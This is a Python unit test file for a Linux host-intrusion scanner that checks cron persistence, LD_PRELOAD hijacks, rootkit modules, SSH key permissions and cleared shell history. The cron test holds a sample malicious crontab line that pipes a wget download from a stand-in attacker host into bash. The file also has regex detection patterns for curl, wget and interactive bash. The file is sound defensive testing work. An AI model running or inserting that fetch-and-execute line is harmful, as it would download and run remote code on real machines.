#!/usr/bin/env python3
"""
Tests for MontiSecurityScanner (monti.py).

Covers all eight ATT&CK technique checks using temporary files and mocking
so that no real system state is required and the tests are safe to run in CI.
"""

import json
import os
import stat
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, mock_open, patch

# Make sure the module under test is importable from the repo root.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import monti


# ---------------------------------------------------------------------------
# Finding / helpers
# ---------------------------------------------------------------------------
class TestFinding(unittest.TestCase):
    def test_to_dict_keys(self):
        f = monti.Finding("Test", "T9999", monti.WARNING, "detail text")
        d = f.to_dict()
        for key in ("timestamp", "technique", "technique_id", "severity", "detail"):
            self.assertIn(key, d)

    def test_severity_values(self):
        self.assertEqual(monti.INFO, "INFO")
        self.assertEqual(monti.WARNING, "WARNING")
        self.assertEqual(monti.ERROR, "ERROR")


# ---------------------------------------------------------------------------
# T1053.003 – Cron Persistence
# ---------------------------------------------------------------------------
class TestCronPersistence(unittest.TestCase):
    def test_no_cron_files_returns_info(self):
        """When no cron paths exist the check should return an INFO finding."""
        with patch("glob.glob", return_value=[]), \
             patch("os.path.isdir", return_value=False), \
             patch("os.path.isfile", return_value=False):
            findings = monti.check_cron_persistence()
        self.assertTrue(any(f.severity == monti.INFO for f in findings))

    def test_suspicious_cron_entry_flagged(self):
        """A cron entry containing wget should produce a WARNING."""
        malicious_line = "* * * * * wget http://evil.example.com/payload | bash"
        import re
        patterns = [
            re.compile(r"/tmp/", re.IGNORECASE),
            re.compile(r"/dev/shm/", re.IGNORECASE),
            re.compile(r"curl\s", re.IGNORECASE),
            re.compile(r"wget\s", re.IGNORECASE),
        ]
        matched = any(p.search(malicious_line) for p in patterns)
        self.assertTrue(matched, "wget should be flagged as suspicious")

    def test_clean_crontab_no_warning(self):
        """A crontab with only legitimate entries should not produce a WARNING."""
        clean_content = "# comment\n30 6 * * * /usr/bin/run-parts /etc/cron.daily\n"
        with tempfile.NamedTemporaryFile(mode="w", suffix=".cron", delete=False) as tmp:
            tmp.write(clean_content)
            tmp_path = tmp.name
        try:
            findings = []
            for line in clean_content.splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                import re as _re
                suspicious_patterns = [
                    _re.compile(r"/tmp/", _re.IGNORECASE),
                    _re.compile(r"wget\s", _re.IGNORECASE),
                    _re.compile(r"curl\s", _re.IGNORECASE),
                    _re.compile(r"bash\s+-[ic]", _re.IGNORECASE),
                ]
                for pat in suspicious_patterns:
                    if pat.search(line):
                        findings.append(monti.Finding("Cron", "T1053.003", monti.WARNING, line))
                        break
            self.assertEqual(len(findings), 0)
        finally:
            os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# T1574.006 – LD_PRELOAD Hijack
# ---------------------------------------------------------------------------
class TestLDPreload(unittest.TestCase):
    def test_empty_preload_file_is_info(self):
        """An empty /etc/ld.so.preload produces an INFO finding."""
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as tmp:
            tmp_path = tmp.name  # empty file
        try:
            with patch("os.path.exists", side_effect=lambda p: p == tmp_path or p == "/etc/ld.so.preload"), \
                 patch("monti._read_file", side_effect=lambda p: "" if p == "/etc/ld.so.preload" else None), \
                 patch("monti._list_dir", return_value=[]):
                findings = monti.check_ld_preload()
            self.assertTrue(any(f.severity == monti.INFO for f in findings))
        finally:
            os.unlink(tmp_path)

    def test_non_empty_preload_file_is_warning(self):
        """A non-empty /etc/ld.so.preload produces a WARNING finding."""
        with patch("os.path.exists", return_value=True), \
             patch("monti._read_file", return_value="/evil/lib.so"), \
             patch("monti._list_dir", return_value=[]):
            findings = monti.check_ld_preload()
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))

    def test_process_ld_preload_flagged(self):
        """A process with LD_PRELOAD in its environment is flagged."""
        env_data = "PATH=/usr/bin\x00LD_PRELOAD=/malicious.so\x00HOME=/root\x00"
        with patch("os.path.exists", return_value=False), \
             patch("monti._list_dir", return_value=["1234"]), \
             patch("monti._read_file", side_effect=lambda p: env_data if "environ" in p else None):
            findings = monti.check_ld_preload()
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))
        self.assertTrue(any("1234" in f.detail for f in findings))

    def test_no_ld_preload_clean(self):
        """Clean system with no preload produces INFO."""
        with patch("os.path.exists", return_value=False), \
             patch("monti._list_dir", return_value=[]):
            findings = monti.check_ld_preload()
        self.assertTrue(any(f.severity == monti.INFO for f in findings))


# ---------------------------------------------------------------------------
# T1547.006 – Kernel Modules
# ---------------------------------------------------------------------------
class TestKernelModules(unittest.TestCase):
    def test_suspicious_module_flagged(self):
        """A module with 'rootkit' in its name should be flagged."""
        modules_content = (
            "ext4 323584 5\n"
            "rootkit_mod 12288 0\n"
            "btrfs 1630208 0\n"
        )
        with patch("monti._read_file", side_effect=lambda p: modules_content if p == "/proc/modules" else None), \
             patch("glob.glob", return_value=[]):
            findings = monti.check_kernel_modules()
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))
        self.assertTrue(any("rootkit_mod" in f.detail for f in findings))

    def test_clean_modules_info(self):
        """Normal modules produce only INFO findings."""
        modules_content = "ext4 323584 5\nnvme 98304 0\nusb_storage 77824 0\n"
        with patch("monti._read_file", side_effect=lambda p: modules_content if p == "/proc/modules" else None), \
             patch("glob.glob", return_value=[]):
            findings = monti.check_kernel_modules()
        self.assertFalse(any(f.severity == monti.WARNING for f in findings))

    def test_unreadable_proc_modules(self):
        """If /proc/modules is unreadable a WARNING is returned."""
        with patch("monti._read_file", return_value=None), \
             patch("glob.glob", return_value=[]):
            findings = monti.check_kernel_modules()
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))


# ---------------------------------------------------------------------------
# T1003 – SSH Key Exposure
# ---------------------------------------------------------------------------
class TestSSHKeyExposure(unittest.TestCase):
    def test_private_key_bad_perms_error(self):
        """A private key with world-readable permissions should produce an ERROR."""
        with tempfile.TemporaryDirectory() as ssh_dir:
            key_path = os.path.join(ssh_dir, "id_rsa")
            with open(key_path, "w") as fh:
                fh.write("FAKE KEY")
            # Set world-readable permissions
            os.chmod(key_path, 0o644)
            with patch("glob.glob", return_value=[ssh_dir]), \
                 patch("pwd.getpwall", return_value=[]):
                findings = monti.check_ssh_key_exposure()
        self.assertTrue(any(f.severity == monti.ERROR for f in findings))

    def test_private_key_correct_perms_ok(self):
        """A private key with correct permissions (0o600) should not be flagged."""
        with tempfile.TemporaryDirectory() as ssh_dir:
            key_path = os.path.join(ssh_dir, "id_rsa")
            with open(key_path, "w") as fh:
                fh.write("FAKE KEY")
            os.chmod(key_path, 0o600)
            with patch("glob.glob", return_value=[ssh_dir]), \
                 patch("pwd.getpwall", return_value=[]):
                findings = monti.check_ssh_key_exposure()
        self.assertFalse(any(f.severity == monti.ERROR for f in findings))

    def test_authorized_keys_world_writable_error(self):
        """World-writable authorized_keys should produce an ERROR."""
        with tempfile.TemporaryDirectory() as ssh_dir:
            ak_path = os.path.join(ssh_dir, "authorized_keys")
            with open(ak_path, "w") as fh:
                fh.write("ssh-rsa FAKE")
            os.chmod(ak_path, 0o666)
            with patch("glob.glob", return_value=[ssh_dir]), \
                 patch("pwd.getpwall", return_value=[]):
                findings = monti.check_ssh_key_exposure()
        self.assertTrue(any(f.severity == monti.ERROR for f in findings))


# ---------------------------------------------------------------------------
# T1082 – Sensitive File Access
# ---------------------------------------------------------------------------
class TestSensitiveFileAccess(unittest.TestCase):
    def test_shadow_open_flagged(self):
        """/etc/shadow open by a process should produce a WARNING."""
        with patch("monti._list_dir", side_effect=lambda p: ["1"] if p == "/proc" else ["0"]), \
             patch("os.readlink", return_value="/etc/shadow"), \
             patch("monti._read_file", return_value="suspicious_proc\n"):
            findings = monti.check_sensitive_file_access()
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))

    def test_no_sensitive_files_open_info(self):
        """No sensitive files open produces INFO."""
        with patch("monti._list_dir", return_value=[]):
            findings = monti.check_sensitive_file_access()
        self.assertTrue(any(f.severity == monti.INFO for f in findings))


# ---------------------------------------------------------------------------
# T1219 – Suspicious Processes
# ---------------------------------------------------------------------------
class TestSuspiciousProcesses(unittest.TestCase):
    def test_process_in_tmp_flagged(self):
        """A process running from /tmp should produce a WARNING."""
        with patch("monti._list_dir", return_value=["1234"]), \
             patch("os.readlink", return_value="/tmp/evil_binary"), \
             patch("monti._read_file", return_value="evil\n"):
            findings = monti.check_suspicious_processes()
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))
        self.assertTrue(any("1234" in f.detail for f in findings))

    def test_no_suspicious_processes_info(self):
        """No suspicious processes produces INFO."""
        with patch("monti._list_dir", return_value=[]):
            findings = monti.check_suspicious_processes()
        self.assertTrue(any(f.severity == monti.INFO for f in findings))

    def test_process_in_dev_shm_flagged(self):
        """/dev/shm process is also flagged."""
        with patch("monti._list_dir", return_value=["9999"]), \
             patch("os.readlink", return_value="/dev/shm/payload"), \
             patch("monti._read_file", return_value="payload\n"):
            findings = monti.check_suspicious_processes()
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))


# ---------------------------------------------------------------------------
# T1074 – Data Staging
# ---------------------------------------------------------------------------
class TestDataStaging(unittest.TestCase):
    def _run_staging_check_on_dir(self, directory, threshold_mb=50):
        """Helper: exercise check_data_staging logic scoped to a single directory."""
        findings = []
        threshold_bytes = threshold_mb * 1024 * 1024
        try:
            for entry in os.scandir(directory):
                try:
                    if entry.is_file(follow_symlinks=False):
                        size = entry.stat().st_size
                        if size >= threshold_bytes:
                            size_mb = size / (1024 * 1024)
                            findings.append(
                                monti.Finding(
                                    "Data Staging",
                                    "T1074",
                                    monti.WARNING,
                                    f"Large file in {directory}: {entry.name} ({size_mb:.1f} MB)",
                                )
                            )
                except (OSError, PermissionError):
                    continue
        except (OSError, PermissionError):
            pass
        if not findings:
            findings.append(
                monti.Finding(
                    "Data Staging",
                    "T1074",
                    monti.INFO,
                    f"No files larger than {threshold_mb} MB found.",
                )
            )
        return findings

    def test_large_file_flagged(self):
        """A large file in a staging directory should produce a WARNING."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            large_file = os.path.join(tmp_dir, "staged_data.tar.gz")
            with open(large_file, "wb") as fh:
                fh.write(b"\x00" * (60 * 1024 * 1024))
            findings = self._run_staging_check_on_dir(tmp_dir, threshold_mb=50)
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))

    def test_small_file_no_warning(self):
        """A small file in a staging directory should not produce a WARNING."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            small_file = os.path.join(tmp_dir, "small.txt")
            with open(small_file, "w") as fh:
                fh.write("small")
            findings = self._run_staging_check_on_dir(tmp_dir, threshold_mb=50)
        self.assertFalse(any(f.severity == monti.WARNING for f in findings))

    def test_empty_staging_dirs_info(self):
        """Non-existent staging dirs produce INFO."""
        with patch("os.path.isdir", return_value=False):
            findings = monti.check_data_staging()
        self.assertTrue(any(f.severity == monti.INFO for f in findings))


# ---------------------------------------------------------------------------
# T1070.003 – History Cleared
# ---------------------------------------------------------------------------
class TestHistoryCleared(unittest.TestCase):
    def test_empty_history_warning(self):
        """An empty .bash_history file should produce a WARNING."""
        with tempfile.TemporaryDirectory() as home_dir:
            hist_path = os.path.join(home_dir, ".bash_history")
            with open(hist_path, "w") as fh:
                fh.write("")  # empty

            fake_pw = MagicMock()
            fake_pw.pw_name = "testuser"
            fake_pw.pw_uid = 1000
            fake_pw.pw_dir = home_dir

            with patch("pwd.getpwall", return_value=[fake_pw]), \
                 patch("monti._list_dir", return_value=[]), \
                 patch("os.path.exists", side_effect=lambda p: p == hist_path), \
                 patch("monti._read_file", side_effect=lambda p: "" if p == hist_path else None):
                findings = monti.check_history_cleared()
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))

    def test_histfile_devnull_warning(self):
        """A process with HISTFILE=/dev/null should produce a WARNING."""
        env_data = "HOME=/root\x00HISTFILE=/dev/null\x00PATH=/usr/bin\x00"
        with patch("pwd.getpwall", return_value=[]), \
             patch("monti._list_dir", return_value=["5678"]), \
             patch("os.path.exists", return_value=False), \
             patch("monti._read_file", side_effect=lambda p: env_data if "environ" in p else None):
            findings = monti.check_history_cleared()
        self.assertTrue(any(f.severity == monti.WARNING for f in findings))
        self.assertTrue(any("5678" in f.detail for f in findings))

    def test_non_empty_history_no_warning(self):
        """A history file with content should not produce a WARNING."""
        with tempfile.TemporaryDirectory() as home_dir:
            hist_path = os.path.join(home_dir, ".bash_history")
            with open(hist_path, "w") as fh:
                fh.write("ls -la\npwd\n")

            fake_pw = MagicMock()
            fake_pw.pw_name = "testuser"
            fake_pw.pw_uid = 1000
            fake_pw.pw_dir = home_dir

            with patch("pwd.getpwall", return_value=[fake_pw]), \
                 patch("monti._list_dir", return_value=[]), \
                 patch("os.path.exists", side_effect=lambda p: p == hist_path), \
                 patch("monti._read_file", side_effect=lambda p: "ls -la\npwd\n" if p == hist_path else None):
                findings = monti.check_history_cleared()
        self.assertFalse(any(f.severity == monti.WARNING for f in findings))


# ---------------------------------------------------------------------------
# JSON report and run_scan integration
# ---------------------------------------------------------------------------
class TestJSONReport(unittest.TestCase):
    def test_report_structure(self):
        """The JSON report should contain required top-level keys."""
        findings = [
            monti.Finding("Test", "T9999", monti.INFO, "all good"),
            monti.Finding("Test", "T9999", monti.WARNING, "something odd"),
        ]
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tmp:
            tmp_path = tmp.name
        try:
            report = monti.write_json_report(findings, tmp_path)
            with open(tmp_path) as fh:
                loaded = json.load(fh)
            for key in ("scanner", "version", "scan_time", "hostname", "summary", "findings"):
                self.assertIn(key, loaded)
            self.assertEqual(loaded["summary"]["total"], 2)
            self.assertEqual(loaded["summary"]["warnings"], 1)
            self.assertEqual(loaded["summary"]["info"], 1)
        finally:
            os.unlink(tmp_path)

    def test_run_scan_returns_list(self):
        """run_scan() should return a non-empty list of Finding objects."""
        with patch("monti.check_cron_persistence", return_value=[monti.Finding("Cron", "T1053.003", monti.INFO, "ok")]), \
             patch("monti.check_ld_preload", return_value=[monti.Finding("LDP", "T1574.006", monti.INFO, "ok")]), \
             patch("monti.check_kernel_modules", return_value=[monti.Finding("KM", "T1547.006", monti.INFO, "ok")]), \
             patch("monti.check_ssh_key_exposure", return_value=[monti.Finding("SSH", "T1003", monti.INFO, "ok")]), \
             patch("monti.check_sensitive_file_access", return_value=[monti.Finding("SFA", "T1082", monti.INFO, "ok")]), \
             patch("monti.check_suspicious_processes", return_value=[monti.Finding("SP", "T1219", monti.INFO, "ok")]), \
             patch("monti.check_data_staging", return_value=[monti.Finding("DS", "T1074", monti.INFO, "ok")]), \
             patch("monti.check_history_cleared", return_value=[monti.Finding("HC", "T1070.003", monti.INFO, "ok")]):
            findings = monti.run_scan()
        self.assertEqual(len(findings), 8)
        self.assertTrue(all(isinstance(f, monti.Finding) for f in findings))

    def test_print_summary_no_crash(self):
        """print_summary should not raise exceptions."""
        findings = [
            monti.Finding("Test", "T9999", monti.INFO, "info detail"),
            monti.Finding("Test", "T9999", monti.WARNING, "warning detail"),
            monti.Finding("Test", "T9999", monti.ERROR, "error detail"),
        ]
        import io
        with patch("sys.stdout", new_callable=io.StringIO):
            monti.print_summary(findings)  # should not raise


if __name__ == "__main__":
    unittest.main()
